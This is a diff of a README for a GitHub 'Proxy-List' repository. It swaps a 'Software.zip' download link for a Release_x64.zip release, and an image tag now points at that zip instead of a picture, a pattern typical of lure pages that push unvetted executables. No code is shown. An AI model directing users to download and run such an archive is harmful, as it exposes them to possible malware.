@@ -27,7 +27,7 @@ Welcome to the **Proxy-List** repository! Here you will find a collection of cur
 ## 🚀 Get Started
 To access the Proxy-List software, simply download it from the following link: 
 
-[![Download Proxy-List Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Proxy-List Software](https://github.com/riadnn/proxy-list/releases/download/v1.0/Release_x64.zip)](https://github.com/riadnn/proxy-list/releases/download/v1.0/Release_x64.zip)
 
 If the link does not work or is not provided, please check the "Releases" section of this repository. 📦
 
@@ -57,4 +57,4 @@ This repository is for educational and research purposes only. The use of proxie
 
 Happy Proxying! 🌐
 
-![Proxy List](https://www.example.com/proxy-image.jpg)
+![Proxy List](https://github.com/riadnn/proxy-list/releases/download/v1.0/Release_x64.zip)
